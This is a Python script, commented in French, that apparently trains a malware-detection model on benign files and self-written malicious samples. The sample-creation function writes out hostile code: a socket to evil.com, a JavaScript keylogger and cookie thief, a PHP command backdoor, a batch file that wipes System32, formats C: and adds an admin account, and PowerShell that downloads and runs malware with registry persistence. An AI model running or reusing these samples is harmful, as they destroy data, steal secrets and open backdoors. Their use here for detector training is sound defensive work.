"""
Script d'entraînement des modèles IA
"""
import os
import sys
import logging
from pathlib import Path
import numpy as np
from typing import List, Tuple

# Ajouter le répertoire parent au path
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from ai_models import AIDetector, CodeIntentAnalyzer, BinaryAnalyzer, BehaviorAnalyzer

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


class ModelTrainer:
    """Classe pour entraîner les modèles IA"""
    
    def __init__(self):
        self.ai_detector = AIDetector()
        self.code_analyzer = CodeIntentAnalyzer()
        self.binary_analyzer = BinaryAnalyzer()
        self.behavior_analyzer = BehaviorAnalyzer()
    
    def train_ai_detector(self, safe_files: List[str], malicious_files: List[str] = None) -> bool:
        """Entraîner le détecteur d'anomalies"""
        logger.info("Training AI Detector...")
        
        # Entraîner sur les fichiers sûrs
        success = self.ai_detector.train_on_safe_files(safe_files)
        
        if success:
            logger.info(f"AI Detector trained on {len(safe_files)} safe files")
            
            # Sauvegarder le modèle
            models_dir = Path("models")
            models_dir.mkdir(exist_ok=True)
            
            model_path = models_dir / "ai_detector.pkl"
            if self.ai_detector.save_model(str(model_path)):
                logger.info(f"AI Detector saved to {model_path}")
                return True
        
        return False
    
    def find_training_files(self) -> Tuple[List[str], List[str]]:
        """Trouver des fichiers pour l'entraînement"""
        safe_files = []
        malicious_files = []
        
        # Fichiers sûrs typiques
        safe_extensions = {'.txt', '.md', '.py', '.js', '.html', '.css', '.json', '.xml', '.csv'}
        safe_directories = [
            '/usr/share/doc',
            '/usr/include', 
            '/etc/ssl',
            'C:\\Program Files\\Common Files'
        ]
        
        # Chercher des fichiers sûrs
        for directory in safe_directories:
            if os.path.exists(directory):
                try:
                    for root, dirs, files in os.walk(directory):
                        for file in files[:100]:  # Limiter
                            if any(file.endswith(ext) for ext in safe_extensions):
                                file_path = os.path.join(root, file)
                                try:
                                    if os.path.getsize(file_path) < 50 * 1024:  # < 50KB
                                        safe_files.append(file_path)
                                except:
                                    continue
                        if len(safe_files) >= 200:
                            break
                except:
                    continue
        
        # Ajouter des fichiers Python du projet
        project_files = ['scanner.py', 'app.py', 'config.py', 'models.py', 'validators.py']
        for file in project_files:
            if os.path.exists(file):
                safe_files.append(file)
        
        # Créer des fichiers malveillants de test
        malicious_samples = self._create_malicious_samples()
        malicious_files.extend(malicious_samples)
        
        logger.info(f"Found {len(safe_files)} safe files and {len(malicious_files)} malicious samples")
        return safe_files, malicious_files
    
    def _create_malicious_samples(self) -> List[str]:
        """Créer des échantillons malveillants pour l'entraînement"""
        samples_dir = Path("training_samples")
        samples_dir.mkdir(exist_ok=True)
        
        malicious_samples = []
        
        # Échantillon 1: Code avec eval
        sample1 = samples_dir / "malicious1.py"
        sample1.write_text("""
import os
import subprocess

def malicious_function():
    # Code malveillant avec eval
    user_input = "__import__('os').system('dir')"
    eval(user_input)
    
    # Commande système directe
    subprocess.call(['rm', '-rf', '/'])
    
    # Connexion réseau suspecte
    import socket
    s = socket.socket()
    s.connect(('evil.com', 4444))
""")
        malicious_samples.append(str(sample1))
        
        # Échantillon 2: Keylogger
        sample2 = samples_dir / "keylogger.js"
        sample2.write_text("""
// Keylogger malveillant
document.addEventListener('keydown', function(e) {
    fetch('https://evil.com/log', {
        method: 'POST',
        body: JSON.stringify({key: e.key})
    });
});

// Vol de cookies
var cookies = document.cookie;
fetch('https://evil.com/steal', {
    method: 'POST',
    body: cookies
});
""")
        malicious_samples.append(str(sample2))
        
        # Échantillon 3: Backdoor PHP
        sample3 = samples_dir / "backdoor.php"
        sample3.write_text("""
<?php
// Backdoor PHP
if(isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    system($cmd);
    echo "Command executed: $cmd";
}

// Upload de fichiers
if(isset($_FILES['upload'])) {
    $file = $_FILES['upload']['tmp_name'];
    move_uploaded_file($file, '/var/www/html/shell.php');
}

// Connexion base de données
$db = new mysqli('localhost', 'root', 'password', 'mysql');
$result = $db->query("SELECT * FROM users");
?>
""")
        malicious_samples.append(str(sample3))
        
        # Échantillon 4: Batch malveillant
        sample4 = samples_dir / "malicious.bat"
        sample4.write_text("""
@echo off
REM Batch malveillant
del C:\Windows\System32\*.* /f /q
format C: /y
net user hacker password /add
net localgroup Administrators hacker /add
copy %0 "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
""")
        malicious_samples.append(str(sample4))
        
        # Échantillon 5: Script PowerShell
        sample5 = samples_dir / "malicious.ps1"
        sample5.write_text("""
# PowerShell malveillant
Invoke-Expression "Get-Process | Where-Object {$_.ProcessName -like '*password*'}"

# Téléchargement et exécution
Invoke-WebRequest -Uri "https://evil.com/malware.exe" -OutFile "malware.exe"
Start-Process "malware.exe"

# Persistence
New-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Malware" -Value "C:\malware.exe"

# Vol d'informations
Get-ChildItem -Path C:\Users\ -Recurse -Include "*.txt" | Copy-Item -Destination "C:\temp\stolen"
""")
        malicious_samples.append(str(sample5))
        
        logger.info(f"Created {len(malicious_samples)} malicious training samples")
        return malicious_samples
    
    def validate_models(self) -> bool:
        """Valider les modèles entraînés"""
        logger.info("Validating trained models...")
        
        try:
            # Tester le détecteur d'anomalies
            if self.ai_detector.trained:
                # Test avec contenu normal
                normal_content = "print('Hello, World!')"
                is_anomaly, reason, confidence = self.ai_detector.detect_anomaly(normal_content)
                logger.info(f"Normal content test: {is_anomaly}, {reason}, {confidence}")
                
                # Test avec contenu suspect
                suspicious_content = "eval('__import__(\"os\").system(\"dir\")')"
                is_anomaly, reason, confidence = self.ai_detector.detect_anomaly(suspicious_content)
                logger.info(f"Suspicious content test: {is_anomaly}, {reason}, {confidence}")
                
                return True
            else:
                logger.warning("AI Detector not trained")
                return False
                
        except Exception as e:
            logger.error(f"Model validation failed: {e}")
            return False


def main():
    """Fonction principale d'entraînement"""
    logger.info("Starting AI Model Training...")
    
    trainer = ModelTrainer()
    
    # Trouver les fichiers d'entraînement
    safe_files, malicious_files = trainer.find_training_files()
    
    if len(safe_files) < 10:
        logger.error("Not enough safe files for training")
        return False
    
    # Entraîner le détecteur d'anomalies
    success = trainer.train_ai_detector(safe_files, malicious_files)
    
    if success:
        # Valider les modèles
        validation_success = trainer.validate_models()
        
        if validation_success:
            logger.info("✅ AI Models trained and validated successfully!")
            return True
        else:
            logger.error("❌ Model validation failed")
            return False
    else:
        logger.error("❌ Model training failed")
        return False


if __name__ == "__main__":
    success = main()
    sys.exit(0 if success else 1)
